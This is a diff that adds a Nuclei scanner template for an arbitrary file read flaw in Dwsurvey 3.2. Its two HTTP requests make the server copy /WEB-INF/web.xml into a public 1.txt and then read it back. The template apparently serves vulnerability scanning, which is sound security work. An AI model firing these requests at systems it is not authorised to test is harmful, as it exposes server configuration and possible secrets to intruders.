@@ -1,0 +1,20 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: DIAOWEN-fileRead
+info:
+  name: Dwsurvey 3.2 Arbitrary File Read
+  author: Str1am
+  severity: high
+  tags: DIAOWEN,fileRead
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/diaowen/toHtml?filePath=/&fileName=1.txt&url=/WEB-INF/web.xml"
+      - "{{BaseURL}}/diaowen/1.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "filter-name"
+          - "servlet-name"
+        part: body
+        condition: or
